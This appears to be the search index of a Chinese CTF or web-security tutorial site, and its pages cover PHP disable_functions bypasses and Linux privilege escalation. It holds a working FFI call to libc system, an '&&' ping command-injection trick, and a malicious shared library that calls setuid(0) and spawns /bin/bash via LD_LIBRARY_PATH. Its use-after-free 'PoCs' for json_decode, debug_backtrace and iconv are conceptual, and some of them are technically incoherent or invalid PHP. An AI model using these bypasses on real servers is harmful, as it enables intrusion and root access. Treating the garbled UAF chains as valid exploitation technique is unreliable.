<p>\u653b\u51fb\u8005\u4f2a\u9020\u65b0\u7684\u5bf9\u8c61\u7ed3\u6784\u6216\u51fd\u6570\u8c03\u7528\u7ed3\u6784\uff0c\u52ab\u6301\u6267\u884c\u6d41\uff0c\u5178\u578b\u7684\u65b9\u5f0f\u5305\u62ec\uff1a</p> <ul> <li>\u4f2a\u9020  <code>zend_execute_data</code>  \u7ed3\u6784</li> <li>\u63a7\u5236  <code>call_user_func()</code>  \u7684\u51fd\u6570\u6307\u9488</li> <li>\u4f2a\u9020  <code>zval</code>  \u6307\u5411\u4e00\u4e2a\u7279\u5b9a\u7684\u51fd\u6570\u8c03\u7528\u7ed3\u6784</li> </ul> <p>\u7b2c\u56db\u6b65\uff1a\u6784\u9020\u7ed5\u8fc7 Payload\uff0c\u5b9e\u73b0\u547d\u4ee4\u6267\u884c</p> <p>\u901a\u8fc7 UAF \u52ab\u6301\u6267\u884c\u6d41\u540e\uff0c\u653b\u51fb\u8005\u6784\u9020\u51fa\u4e00\u4e2a\u51fd\u6570\u8c03\u7528\u94fe\uff0c\u6700\u7ec8\u8df3\u8f6c\u5230\u539f\u672c\u88ab\u7981\u7528\u7684\u51fd\u6570\uff08\u5982 system\uff09\u6240\u5728\u7684\u4f4d\u7f6e\uff0c\u5e76\u6267\u884c\u547d\u4ee4</p> <pre><code>$func = \"system\"; // \u88ab disable_functions \u7981\u7528\u4e86\n$evil_payload = [$func, \"whoami\"]; // \u7ecf\u8fc7 UAF \u6267\u884c\u8fd9\u6bb5\n</code></pre> <p>PHP \u4f1a\u8ba4\u4e3a\u662f\u6b63\u5e38\u7684\u56de\u8c03\u51fd\u6570\uff0c\u800c\u7ed5\u8fc7  <code>disable_functions</code>  \u7684\u68c0\u67e5</p> <p>\u8681\u5251\u68ad\u54c8</p> <p></p>"},{"location":"Web/Chapter6/6-39/","title":"Json Serializer UAF \u63d0\u6743","text":""},{"location":"Web/Chapter6/6-39/#json-serializer-uaf-\u63d0\u6743","title":"Json Serializer UAF \u63d0\u6743","text":"<p>JSON \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e</p> <p><code>json_decode()</code>  \u5728\u5904\u7406\u7279\u5b9a\u7684\u5bf9\u8c61\uff08\u5982\u5b9e\u73b0\u4e86  <code>__wakeup()</code>  \u6216  <code>__destruct()</code>  \u65b9\u6cd5\u7684\u7c7b\uff09\u65f6\uff0c\u53ef\u4ee5\u89e6\u53d1\u654f\u611f\u64cd\u4f5c\u3002\u5982\u679c\u914d\u5408\u5f31\u7c7b\u578b\u6bd4\u8f83\u6216 UAF\uff0c\u53ef\u80fd\u5b9e\u73b0\u5229\u7528</p> <p>\u6b65\u9aa4 1\uff1a\u6784\u9020\u89e6\u53d1\u70b9</p> <p>\u67d0\u4e9b PHP \u5185\u5efa\u7c7b\uff08\u5982 <code>DateInterval</code>, <code>SplFileObject</code> \u7b49\uff09\u5728 \u53cd\u5e8f\u5217\u5316\u8fc7\u7a0b\u4e2d\u91ca\u653e\u5185\u5b58\u5bf9\u8c61\uff0c\u800c \u9519\u8bef\u5730\u5728\u4e4b\u540e\u53c8\u5f15\u7528\u4e86\u8be5\u5bf9\u8c61\uff0c\u9020\u6210 UAF\u3002\u4f8b\u5982\uff1a</p> <pre><code>$json = '{\"date_string\":\"P1D\"}'; \n\n# \u7b2c\u4e00\u4e2a\u53c2\u6570 $json\uff1a\u8981\u89e3\u7801\u7684 JSON \u5b57\u7b26\u4e32\n# \u7b2c\u4e8c\u4e2a\u53c2\u6570 false\uff1a\u5f53\u4e3a false \u65f6\uff0c\u8fd4\u56de\u5bf9\u8c61\uff1b\u5f53\u4e3a true \u65f6\uff0c\u8fd4\u56de\u5173\u8054\u6570\u7ec4\u3002\u4e0d\u8fc7\u8fd9\u4e2a\u884c\u4e3a\u4f1a\u88ab\u7b2c\u56db\u4e2a\u53c2\u6570\u8986\u76d6\n# \u7b2c\u4e09\u4e2a\u53c2\u6570 512\uff1a\u9012\u5f52\u6df1\u5ea6\uff0c\u8fd9\u91cc\u662f\u9ed8\u8ba4\u503c\n# \u7b2c\u56db\u4e2a\u53c2\u6570 JSON_OBJECT_AS_ARRAY\uff1a\u8fd9\u662f\u4e00\u4e2a\u5e38\u91cf\uff0c\u8868\u793a\u5c06 JSON \u5bf9\u8c61\u89e3\u7801\u4e3a\u5173\u8054\u6570\u7ec4\u800c\u4e0d\u662f\u5bf9\u8c61\u3002\u8fd9\u4f1a\u8986\u76d6\u7b2c\u4e8c\u4e2a\u53c2\u6570\u7684\u884c\u4e3a\n$obj = json_decode($json, false, 512, JSON_OBJECT_AS_ARRAY);\n</code></pre> <p>\u5728\u67d0\u4e9b\u7248\u672c\u4e2d\uff0c<code>DateInterval</code>  \u7684\u89e3\u6790\u4f1a\u8c03\u7528\u5e95\u5c42 C \u5b9e\u73b0\u7684\u89e3\u6790\u903b\u8f91\uff0c\u91ca\u653e\u90e8\u5206\u5185\u90e8\u7ed3\u6784\u540e\u4ecd\u8bbf\u95ee\u5b83</p> <p>\u6b65\u9aa4 2\uff1a\u5e03\u7f6e\u5185\u5b58\u5e03\u5c40</p> <p>\u4f7f\u7528 PHP \u7528\u6237\u5b9a\u4e49\u5bf9\u8c61\u6216\u6570\u7ec4\u5806\u55b7\uff08heap spraying\uff09\u8986\u76d6\u91ca\u653e\u6389\u7684\u5185\u5b58\uff0c\u4f7f\u5f97 UAF \u6307\u9488\u6307\u5411\u653b\u51fb\u8005\u53ef\u63a7\u5185\u5bb9</p> <pre><code>$payload = str_repeat(\"A\", 1024); // \u53ef\u63a7\u6570\u636e\u66ff\u6362\u88ab\u91ca\u653e\u7684\u5185\u5b58\n</code></pre> <p>\u6b65\u9aa4 3\uff1a\u4f2a\u9020 zend_function \u7ed3\u6784</p> <p>\u5728 PHP \u5e95\u5c42\uff0c\u51fd\u6570\u6307\u9488\u4fdd\u5b58\u5728  <code>zend_function</code>  \u7ed3\u6784\u4e2d\u3002\u653b\u51fb\u8005\u8986\u76d6 UAF \u5185\u5b58\uff0c\u4f7f\u5176\u770b\u8d77\u6765\u50cf\u4e00\u4e2a\u51fd\u6570\u5bf9\u8c61\uff0c\u4f2a\u9020 <code>handler</code>  \u6307\u5411\u4efb\u610f\u5730\u5740\uff08\u5982 libc \u7684 <code>system()</code>\uff09\uff0c\u6216\u6784\u9020 ROP \u94fe\uff0c\u6700\u7ec8\u5b9e\u73b0\u6267\u884c</p> <pre><code>[ fake zend_function ]:\n+0x00 handler =&gt; 0xdeadbeef (system \u6216 gadgets)\n+0x08 function_name =&gt; \"/bin/sh\"\n</code></pre> <p>\u6b65\u9aa4 4\uff1a\u8c03\u7528\u4f2a\u51fd\u6570\u89e6\u53d1\u6267\u884c</p> <p>\u901a\u8fc7\u67d0\u4e9b\u9b54\u672f\u65b9\u6cd5\uff08\u5982  <code>__destruct</code>, <code>__call</code>, <code>__invoke</code>\uff09\u6216\u7279\u5b9a\u5185\u5efa\u51fd\u6570\uff08\u5982  <code>call_user_func()</code>\uff09\u8c03\u7528\u4f2a\u51fd\u6570\uff0c\u89e6\u53d1\u6267\u884c  <code>handler</code></p> <pre><code>call_user_func($fake_function, \"/bin/sh\");\n</code></pre> <p>\u6b64\u65f6\uff0cPHP \u8c03\u7528\u7684\u662f\u4f2a\u9020\u7684\u51fd\u6570\u5bf9\u8c61\uff0c\u5b9e\u8d28\u6267\u884c\u7684\u662f\u4efb\u610f\u5730\u5740\u4e0a\u7684\u51fd\u6570\uff0c\u6bd4\u5982 <code>system(\"/bin/sh\")</code></p> <p>\u771f\u5b9e\u5229\u7528\u6848\u4f8b\uff08\u6982\u5ff5\uff09</p> <pre><code>&lt;?php\n\nclass Evil {\n    public $cmd;\n\n    function __destruct() {\n        // \u89e6\u53d1\u4f2a\u9020\u51fd\u6570\u6267\u884c\n        call_user_func($this-&gt;cmd);\n    }\n}\n\n// Step 1: \u89e6\u53d1 UAF\uff08\u6bd4\u5982\u67d0\u7c7b\u53cd\u5e8f\u5217\u5316\u89e6\u53d1\uff09\n$victim = json_decode('{\"a\":\"...\"}', false);\n\n// Step 2: \u7528\u6211\u4eec\u63a7\u5236\u7684\u6570\u636e\u91cd\u53e0\u91ca\u653e\u7684\u5185\u5b58\nfor ($i = 0; $i &lt; 10000; $i++) {\n    $spray[] = str_repeat(\"A\", 1024);\n}\n\n// Step 3: \u8bbe\u7f6e\u4f2a\u51fd\u6570\u7ed3\u6784\u5e76\u6267\u884c\n$evil = new Evil();\n$evil-&gt;cmd = \"/bin/sh\"; // \u5b9e\u9645\u6307\u5411\u4f2a\u51fd\u6570\u7ed3\u6784\n</code></pre> <p>\u8681\u5251\u68ad\u54c8</p> <p></p>"},{"location":"Web/Chapter6/6-4/","title":"&& \u4ee3\u66ff & \u7ed5\u8fc7","text":""},{"location":"Web/Chapter6/6-4/#-\u4ee3\u66ff--\u7ed5\u8fc7","title":"&amp;&amp; \u4ee3\u66ff &amp; \u7ed5\u8fc7","text":"<p>\u6253\u5f00\u7f51\u9875\u662f\u4e00\u4e2a\u6267\u884c Ping \u547d\u4ee4\u7136\u540e\u7ed9\u56de\u663e</p> <p></p> <p>\u4f7f\u7528 &amp;&amp; \u53ef\u4ee5\u7ed5\u8fc7\uff0c&amp;&amp; \u5de6\u8fb9\u547d\u4ee4\u6210\u529f\u6267\u884c\u5219\u4f1a\u6267\u884c\u53f3\u8fb9\u7684</p> <p></p>"},{"location":"Web/Chapter6/6-40/","title":"Backtrace UAF \u63d0\u6743","text":""},{"location":"Web/Chapter6/6-40/#backtrace-uaf-\u63d0\u6743","title":"Backtrace UAF \u63d0\u6743","text":"<p>PHP \u7684 <code>debug_backtrace()</code>  \u548c <code>Exception::getTrace()</code> \u4f1a\u5728\u8fd0\u884c\u65f6\u751f\u6210\u4e00\u4e2a\u8c03\u7528\u6808\uff08trace\uff09\uff0c\u5305\u542b\u51fd\u6570\u3001\u6587\u4ef6\u3001\u884c\u53f7\u3001\u53c2\u6570\u7b49</p> <p>\u8fd9\u4e2a\u8c03\u7528\u6808\u5b9e\u9645\u4e0a\u662f zval \u7ed3\u6784\u4f53\u7ec4\u6210\u7684\u6570\u7ec4\uff0c\u5305\u62ec\u51fd\u6570\u6307\u9488\u3001\u7c7b\u540d\u3001\u53c2\u6570\u6307\u9488\u7b49</p> <p>\u5173\u952e\u70b9\u662f\uff1a\u5728\u6784\u9020  <code>backtrace</code> \u65f6\uff0cPHP \u4f1a\u5c06\u5f53\u524d\u7684\u6267\u884c\u6808\u538b\u5165\u4e34\u65f6\u5185\u5b58</p> <p>\ud83d\udca1 1. \u6784\u9020 backtrace \u5f15\u53d1\u4e34\u65f6\u7ed3\u6784\u4f53\u5206\u914d</p> <pre><code>function trigger() {\n    debug_backtrace();\n}\n</code></pre> <p>\u5f53\u8c03\u7528 <code>debug_backtrace()</code>\uff0cPHP \u4f1a\u6784\u9020\u4e00\u4e2a <code>zend_execute_data</code> \u7ed3\u6784\u4f53\u7684\u5feb\u7167\uff0c\u7528\u4e8e\u4fdd\u5b58\u5f53\u524d\u8c03\u7528\u6808\uff0c\u8fd9\u91cc\u9762\u5305\u542b\u5f88\u591a\u6307\u9488\uff0c\u5982\uff1a</p> <ul> <li>\u51fd\u6570\u540d\uff08function_name\uff09</li> <li>\u7c7b\u540d\uff08class_name\uff09</li> <li>\u53c2\u6570\uff08zval \u6307\u9488\uff09</li> <li>zend_function \u6307\u9488\uff08\u53ef\u80fd\u6709\u6267\u884c\u51fd\u6570 handler\uff09</li> </ul> <p>\ud83d\udca1 2. \u5f15\u53d1\u67d0\u4e9b\u5bf9\u8c61\u7684\u91ca\u653e\uff08free\uff09</p> <p>\u5229\u7528\u67d0\u4e9b\u8bed\u8a00\u7279\u6027\u6216\u8005\u5bf9\u8c61\u6790\u6784\u7b49\u65b9\u5f0f\uff0c\u8ba9\u4e00\u4e9b\u7ed3\u6784\u4f53**\u91ca\u653e\u6389\u4f46\u4ecd\u4fdd\u7559\u5f15\u7528**</p> <pre><code>class A {\n    public function __destruct() {\n        global $a;\n        unset($a); // \u5f15\u53d1\u6790\u6784\n        debug_backtrace(); // \u8c03\u7528\u65f6\u91ca\u653e\u5bf9\u8c61\u5bfc\u81f4\u60ac\u7a7a\u5f15\u7528\n    }\n}\n</code></pre> <p>\ud83d\udca1 3. \u91cd\u65b0\u5206\u914d\u91ca\u653e\u540e\u7684\u5185\u5b58\uff08\u586b\u5145 UAF\uff09</p> <p>\u63a5\u4e0b\u6765\u653b\u51fb\u8005\u4f1a\u5206\u914d**\u7528\u6237\u53ef\u63a7\u7684\u6570\u636e**\uff0c\u4f8b\u5982\u5b57\u7b26\u4e32\u3001\u6570\u7ec4\u3001\u5bf9\u8c61\u7b49\uff0c\u6765**\u586b\u5145\u5df2\u7ecf\u91ca\u653e\u7684\u5185\u5b58\u533a\u57df**</p> <p>\u7531\u4e8e PHP \u4f7f\u7528\u5806\u5185\u5b58\u7ba1\u7406\u673a\u5236\uff08Zend Memory Manager\uff09\uff0c\u91ca\u653e\u540e\u7684\u5185\u5b58\u4f1a\u88ab\u4f18\u5148\u590d\u7528</p> <pre><code>$fake_func = str_repeat(\"\\x41\", 100); // \u7528 'A' \u91cd\u5199\u91ca\u653e\u7684\u7ed3\u6784\u4f53\n</code></pre> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u63a7\u5236\u4e00\u4e9b\u504f\u79fb\u5904\u7684\u5185\u5bb9\u6765\u4f2a\u9020 <code>zend_function</code>\u3001<code>zend_execute_data</code> \u7b49\u7ed3\u6784\u4f53\uff0c\u4ece\u800c\u63a7\u5236\u6267\u884c\u6d41</p> <p>\ud83d\udca1 4. \u5229\u7528\u8c03\u7528\u5806\u6808\u4e2d\u7684\u51fd\u6570\u6307\u9488\u5b8c\u6210\u63a7\u5236\u6d41\u52ab\u6301</p> <p>\u5728\u8c03\u7528 backtrace \u7684\u65f6\u5019\uff0cPHP \u4f1a\u5c1d\u8bd5\u8bfb\u53d6 <code>zend_function</code> \u5e76\u8c03\u7528\u5176\u4e2d\u7684 <code>internal_function.handler</code></p> <p>\u5982\u679c\u8fd9\u4e2a\u7ed3\u6784\u4f53\u662f\u4f2a\u9020\u7684\u3001\u7528\u6237\u53ef\u63a7\u7684\uff0c\u90a3\u8fd9\u4e2a handler \u5c31\u53d8\u6210\u4e86\u4efb\u610f\u5730\u5740\uff01</p> <p>\u653b\u51fb\u8005\u5c31\u53ef\u4ee5\u8df3\u8f6c\u5230\uff1a</p> <ul> <li>libc \u7684 <code>system()</code> \u51fd\u6570</li> <li>\u5df2\u77e5\u5730\u5740\u7684 shellcode</li> <li>php-fpm \u6216 apache \u4e2d\u7684\u5176\u4ed6\u51fd\u6570\u5730\u5740\uff08\u5982 <code>execvp</code>, <code>popen</code>, \u7b49\uff09</li> </ul> <pre><code>class Trigger {\n    function __destruct() {\n        debug_backtrace(); // \u5f15\u53d1\u6808\u5206\u914d + UAF\n    }\n}\n\n$a = new Trigger();\nunset($a); // \u5f15\u53d1 __destruct\n\n// \u586b\u5145\u5df2\u91ca\u653e\u5185\u5b58\n$payload = str_repeat(\"\\x00\", 0x100); // \u63a7\u5236\u7ed3\u6784\u4f53\u5185\u5bb9\n\n// \u6b64\u65f6 handler \u88ab\u52ab\u6301\uff0c\u8df3\u5230 system(\"/readflag\") \u7b49\u5730\u5740\n</code></pre> <p>\u8681\u5251\u63d2\u4ef6\u76f4\u63a5\u68ad\u54c8</p> <p></p>"},{"location":"Web/Chapter6/6-41/","title":"FFI \u6269\u5c55\u63d0\u6743","text":""},{"location":"Web/Chapter6/6-41/#ffi-\u6269\u5c55\u63d0\u6743","title":"FFI \u6269\u5c55\u63d0\u6743","text":"<p>FFI \u7684\u672c\u8d28\u662f\u4f7f\u7528 libffi \u548c dlopen/dlsym \u5c06\u7cfb\u7edf\u7684 libc \u51fd\u6570\u7ed1\u5b9a\u5230 PHP\uff0c\u4ece\u800c\u7ed5\u8fc7 PHP \u5c42\u7684\u9650\u5236</p> <p>\u5373\u4f7f PHP \u7981\u7528\u4e86 <code>exec()</code>\uff0c\u653b\u51fb\u8005\u4ecd\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u6d41\u7a0b\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\uff1a</p> <p>\u5229\u7528  <code>FFI::cdef()</code> \u279c \u58f0\u660e  <code>int system(const char *cmd)</code> \u279c \u5229\u7528  FFI \u627e\u5230  libc \u279c \u8c03\u7528  <code>system()</code></p> <p>\u6838\u5fc3\u5229\u7528\u6d41\u7a0b\u8be6\u89e3</p> <pre><code>&lt;?php\n// \u7b2c\u4e00\u6b65\uff1a\u6784\u9020 C \u51fd\u6570\u58f0\u660e\n$ffi = FFI::cdef(\n    \"int system(const char *command);\",  // C \u8bed\u8a00\u7684\u51fd\u6570\u539f\u578b\n    \"libc.so.6\"                           // Linux \u7cfb\u7edf libc \u52a8\u6001\u5e93\n);\n\n// \u7b2c\u4e8c\u6b65\uff1a\u8c03\u7528 system \u547d\u4ee4\n$ffi-&gt;system(\"id\");  // \u7b49\u540c\u4e8e system(\"id\");\n?&gt;\n</code></pre> <ol> <li><code>FFI::cdef()</code> \u4e2d\u58f0\u660e\u4e86 <code>int system(const char *command);</code>\uff1b</li> <li><code>libc.so.6</code> \u662f Linux \u4e0b\u6807\u51c6 C \u51fd\u6570\u5e93\uff0c\u5305\u542b\u4e86 <code>system()</code>\uff1b</li> <li>\u8c03\u7528 <code>$ffi-&gt;system(\"id\")</code> \u7b49\u540c\u4e8e PHP \u4e2d\u7684 <code>system(\"id\")</code>\uff1b</li> <li>\u5373\u4f7f <code>disable_functions=system,exec,passthru</code>\uff0c\u8fd9\u6bb5\u4ee3\u7801\u4ecd\u7136\u6210\u529f\u6267\u884c\u547d\u4ee4</li> </ol> \u6761\u4ef6 \u8bf4\u660e PHP \u2265 7.4 FFI \u6269\u5c55\u662f\u4ece PHP 7.4 \u5f00\u59cb\u5f15\u5165\u7684 FFI \u6269\u5c55\u542f\u7528 <code>php.ini</code> \u4e2d <code>extension=ffi</code> <code>ffi.enable=true</code> \u63a7\u5236\u662f\u5426\u5141\u8bb8 FFI \u529f\u80fd\uff08\u9ed8\u8ba4\u751f\u4ea7\u73af\u5883\u4e3a false\uff09 <code>disable_functions</code> \u751f\u6548 FFI \u662f\u5e95\u5c42\u8c03\u7528\uff0c\u4e0d\u53d7\u5f71\u54cd <p>\u8681\u5251\u4e00\u952e\u68ad\u54c8</p> <p></p>"},{"location":"Web/Chapter6/6-42/","title":"iconv \u63d0\u6743","text":""},{"location":"Web/Chapter6/6-42/#iconv-\u63d0\u6743","title":"iconv \u63d0\u6743","text":"<p>UAF \u5229\u7528\u70b9\uff1aiconv \u7f13\u51b2\u91ca\u653e\u4e0d\u5f53</p> <p>\u67d0\u4e9b <code>iconv_*</code> \u51fd\u6570\uff08\u6bd4\u5982 <code>iconv_strlen()</code>\uff09\u5728\u5904\u7406\u975e\u6cd5\u5b57\u7b26\u65f6\u4f1a\u89e6\u53d1\u9519\u8bef\u6d41\u7a0b\uff0c\u4f8b\u5982\uff1a</p> <pre><code>iconv_strlen(\"\\x80\", \"UTF-8\");\n</code></pre> <p>\u4e0a\u8ff0\u4ee3\u7801\u4f1a\u5c1d\u8bd5\u5904\u7406\u975e\u6cd5\u7684 UTF-8 \u5b57\u8282\u6d41\uff0c\u5f15\u53d1\u5e95\u5c42\u9519\u8bef\u3002\u4f46\u5728\u65e7\u7248 PHP \u7684\u5904\u7406\u903b\u8f91\u4e2d\uff1a</p> <ul> <li>\u4f1a\u5148\u5206\u914d buffer</li> <li>\u51fa\u9519\u65f6\u6ca1\u6709\u5b8c\u5168\u91ca\u653e\u6216\u91ca\u653e\u540e\u6ca1\u6709\u6e05\u7a7a\u6307\u9488</li> <li>\u4e0b\u4e00\u6b21\u5206\u914d\u5bf9\u8c61\u65f6\u53ef\u80fd\u590d\u7528\u4e86\u8fd9\u6bb5\u5185\u5b58\uff0c\u4ece\u800c\u5bfc\u81f4 UAF</li> </ul> <p>\u52ab\u6301\u5bf9\u8c61\u7ed3\u6784</p> <p>UAF \u5229\u7528\u7684\u76ee\u6807\u662f\u52ab\u6301 PHP \u7684\u5185\u90e8\u5bf9\u8c61\u7ed3\u6784\uff08\u5982 <code>zend_object</code>\uff09\uff0c\u4f8b\u5982\u901a\u8fc7\u81ea\u5b9a\u4e49\u7c7b\u4e0e\u6790\u6784\u903b\u8f91\uff1a</p> <pre><code>class Vuln {\n    public $a, $b;\n    function __destruct() {\n        global $exploit;\n        echo $exploit;\n    }\n}\n</code></pre> <p>\u653b\u51fb\u8005\u901a\u8fc7\uff1a</p> <ul> <li>\u6784\u9020\u591a\u4e2a\u5bf9\u8c61</li> <li>\u5229\u7528 iconv \u7684\u6f0f\u6d1e\u7834\u574f\u65e7\u5bf9\u8c61\u7684\u7ed3\u6784</li> <li>\u5728\u540c\u4e00\u4e2a\u4f4d\u7f6e\u5206\u914d\u65b0\u7684\u6570\u636e\uff08\u5982\u5b57\u7b26\u4e32\uff09\uff0c\u4ece\u800c\u52ab\u6301\u865a\u62df\u51fd\u6570\u6307\u9488</li> </ul> <p>\u6700\u7ec8\u53ef\u4ee5\u5b9e\u73b0\u7c7b\u4f3c\uff1a</p> <pre><code>call_user_func($fake_function_pointer); // \u4efb\u610f\u5730\u5740\u6267\u884c\n</code></pre> <p>\u6784\u9020 fake closure \u6267\u884c system</p> <p>PHP \u7684 <code>Closure</code> \u7ed3\u6784\u5728\u5185\u5b58\u4e2d\u7684\u8868\u793a\u662f\u53ef\u4ee5\u4f2a\u9020\u7684\u3002\u4f8b\u5982\u5982\u4e0b\u4f2a\u6784\u9020\uff1a</p> <pre><code>// \u5185\u5b58\u4e2d\u6784\u9020 fake Closure \u5bf9\u8c61\u7ed3\u6784\u4f53\uff0c\u6307\u5411 zend_execute_ex -&gt; system\n$fake_closure = \"\\x00\" * offset . ptr_to_system;\n$cb = unserialize($fake_closure);\n$cb(\"id\");\n</code></pre> <p>\u901a\u8fc7 <code>iconv</code> \u7684 UAF \u52ab\u6301\u4f7f\u5185\u5b58\u4e2d\u7684 closure \u7ed3\u6784\u53d8\u6210\u6307\u5411 <code>system()</code> \u7684\u6267\u884c\u903b\u8f91\uff0c\u4ece\u800c\u5b9e\u73b0\u7ed5\u8fc7 <code>disable_functions</code></p> <p>\u5229\u7528\u94fe\u793a\u610f</p> <pre><code>flowchart TD\n    A[iconv_strlen \u5b58\u5728 Use-After-Free] --&gt; B[\u91ca\u653e\u4f46\u672a\u6e05\u9664\u5185\u5b58]\n    B --&gt; C[\u91cd\u65b0\u5206\u914d\u5bf9\u8c61/\u5b57\u7b26\u4e32\u8986\u76d6\u65e7\u5185\u5b58]\n    C --&gt; D[\u4f2a\u9020 zend_object \u7ed3\u6784]\n    D --&gt; E[\u6784\u9020 fake Closure]\n    E --&gt; F[\u8c03\u7528\u4efb\u610f\u51fd\u6570 system]\n    F --&gt; G[\u7ed5\u8fc7 disable_functions]</code></pre> <p>\u771f\u5b9e\u5229\u7528 POC\uff08\u7b80\u5316\uff09</p> <pre><code>// \u5047\u8bbe iconv UAF \u5b58\u5728\niconv_strlen(\"\\x80\", \"UTF-8\"); // \u89e6\u53d1\u91ca\u653e\n\nclass Vuln {\n    public $cmd;\n    function __destruct() {\n        eval($this-&gt;cmd);\n    }\n}\n\n// \u6cc4\u9732 + \u6784\u9020 + \u52ab\u6301\uff08\u7701\u7565\u7ec6\u8282\uff09\n$a = new Vuln();\n$a-&gt;cmd = \"system('id');\";\n\n// \u6784\u9020 fake object\uff08\u901a\u8fc7 UAF \u5b9e\u73b0\uff09\n</code></pre> <p>\u8681\u5251\u76f4\u63a5\u68ad\u54c8</p> <p></p>"},{"location":"Web/Chapter6/6-43/","title":"\u52a8\u6001\u52a0\u8f7d\u5668\u63d0\u6743","text":""},{"location":"Web/Chapter6/6-43/#\u52a8\u6001\u52a0\u8f7d\u5668\u63d0\u6743","title":"\u52a8\u6001\u52a0\u8f7d\u5668\u63d0\u6743","text":"<p>Linux \u52a8\u6001\u52a0\u8f7d\u5668</p> <p>\u5f53\u4e00\u4e2a\u52a8\u6001\u94fe\u63a5\u7684\u7a0b\u5e8f\u88ab\u6267\u884c\u65f6\uff1a</p> <ol> <li>\u5185\u6838\u52a0\u8f7d ELF \u53ef\u6267\u884c\u6587\u4ef6</li> <li>\u5185\u6838\u53d1\u73b0\u5b83\u662f\u52a8\u6001\u94fe\u63a5\u7684\uff0c\u4e8e\u662f\u4e0d\u76f4\u63a5\u8df3\u8f6c\u5230 <code>main()</code>\uff0c\u800c\u662f\u8f6c\u800c\u5148\u6267\u884c\u52a8\u6001\u94fe\u63a5\u5668\uff08\u4f8b\u5982 <code>/lib64/ld-linux-x86-64.so.2</code>\uff09</li> <li>\u52a8\u6001\u94fe\u63a5\u5668\u4f1a\u89e3\u6790 ELF \u7684 <code>.interp</code> \u6bb5\uff0c\u52a0\u8f7d\u6240\u6709\u4f9d\u8d56\u7684 <code>.so</code>\uff0c\u6267\u884c\u7b26\u53f7\u91cd\u5b9a\u4f4d\uff0c\u7136\u540e\u8df3\u8f6c\u5230\u7528\u6237\u7a0b\u5e8f\u7684\u5165\u53e3\u70b9</li> </ol> <p>\u52a8\u6001\u52a0\u8f7d\u5668\u672c\u8eab\u662f\u5b89\u5168\u7684\uff0c\u4f46\u4ee5\u4e0b\u673a\u5236\u53ef\u80fd\u88ab\u653b\u51fb\u8005\u5229\u7528\u6765\u5b9e\u73b0**\u672c\u5730\u63d0\u6743**\uff1a</p> <p>\u2705 1. \u73af\u5883\u53d8\u91cf\u52ab\u6301\uff08LD_ \u7cfb\u5217\uff09</p> <p>Linux \u52a8\u6001\u94fe\u63a5\u5668\u5728\u6267\u884c\u8fc7\u7a0b\u4e2d\u4f1a\u89e3\u6790\u591a\u4e2a\u73af\u5883\u53d8\u91cf\uff0c\u5982\uff1a</p> \u73af\u5883\u53d8\u91cf \u63cf\u8ff0 <code>LD_PRELOAD</code> \u6307\u5b9a\u8981\u9884\u5148\u52a0\u8f7d\u7684\u5171\u4eab\u5e93\u8def\u5f84\u3002 <code>LD_LIBRARY_PATH</code> \u6307\u5b9a\u989d\u5916\u641c\u7d22\u5171\u4eab\u5e93\u8def\u5f84\u3002 <code>LD_AUDIT</code> \u6307\u5b9a\u5ba1\u8ba1\u5e93\uff0c\u7528\u4e8e\u62e6\u622a\u51fd\u6570\u8c03\u7528\u3002 <p>\u524d\u63d0\uff1a\u52a8\u6001\u94fe\u63a5\u7a0b\u5e8f\uff0c\u4e14\u4e0d\u662f setuid \u7a0b\u5e8f\uff08\u5bf9 setuid \u7a0b\u5e8f\uff0c\u8fd9\u4e9b\u53d8\u91cf\u901a\u5e38\u88ab\u5ffd\u7565\uff09</p> <p>\u63d0\u6743\u5229\u7528\uff1a</p> <ul> <li>\u82e5\u5b58\u5728\u4e00\u4e2a\u4ee5 root \u6743\u9650\u6267\u884c\u7684 \u975e setuid \u7a0b\u5e8f\uff08\u5982\u67d0\u4e9b misconfigured \u7684\u5b88\u62a4\u8fdb\u7a0b\uff09\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u7be1\u6539 <code>LD_PRELOAD</code> \u6765\u6ce8\u5165\u81ea\u5df1\u7684 <code>.so</code> \u4ee5\u6267\u884c\u4efb\u610f\u4ee3\u7801</li> </ul> <p>\u2705 2. \u5229\u7528 SUID \u53ef\u6267\u884c\u7a0b\u5e8f\u4e2d\u7684\u52a0\u8f7d\u5668\u884c\u4e3a</p> <p>\u5229\u7528\u65b9\u5f0f\u4e00\uff1a\u81ea\u5b9a\u4e49\u7684\u52a8\u6001\u52a0\u8f7d\u5668</p> <p>\u67d0\u4e9b\u53d1\u884c\u7248/\u73af\u5883\u4e2d\u5141\u8bb8\u81ea\u5b9a\u4e49 <code>.interp</code> \u6bb5\uff0c\u6bd4\u5982\u5c06\u5176\u6307\u5411\u653b\u51fb\u8005\u81ea\u7f16\u8bd1\u7684 <code>ld-linux.so</code>\uff1a</p> <pre><code># \u4fee\u6539 interp \u6bb5\npatchelf --set-interpreter ./evil-ld.so.2 ./suid-binary\n</code></pre> <p>\u82e5\u76ee\u6807\u7a0b\u5e8f\u662f SUID \u4e14\u672a\u505a\u5f3a\u6821\u9a8c\uff0c\u5219\u653b\u51fb\u8005\u53ef\u501f\u6b64\u6267\u884c\u81ea\u5df1\u7684\u52a0\u8f7d\u5668\uff0c\u4ece\u800c\u63a7\u5236\u6574\u4e2a\u52a0\u8f7d\u8fc7\u7a0b\u5e76\u63d0\u6743</p> <p>\u6ce8\u610f\uff1a\u591a\u6570\u73b0\u4ee3\u7cfb\u7edf\u5bf9\u6b64\u6709\u4fdd\u62a4\uff0c\u53ea\u6709\u5f53\u76ee\u6807\u7a0b\u5e8f\u662f\u7528\u6237\u81ea\u5df1\u7f16\u8bd1\u7684\u60c5\u51b5\u4e0b\u624d\u53ef\u80fd\u5b9e\u73b0\u8be5\u653b\u51fb</p> <p>\u5229\u7528\u65b9\u5f0f\u4e8c\uff1a\u4f2a\u9020\u5171\u4eab\u5e93\u8def\u5f84</p> <pre><code># \u521b\u5efa SUID \u7a0b\u5e8f\u8fd0\u884c\u6240\u9700\u7684\u5171\u4eab\u5e93\u540d\u79f0\necho 'int init() { setuid(0); system(\"/bin/bash\"); return 0; }' &gt; exploit.c\ngcc -shared -fPIC exploit.c -o libmylib.so\n\n# \u8bbe\u7f6e LD_LIBRARY_PATH \u5e76\u8fd0\u884c\u76ee\u6807\u7a0b\u5e8f\nLD_LIBRARY_PATH=. ./vuln-suid-binary\n</code></pre> <p>\u82e5 SUID 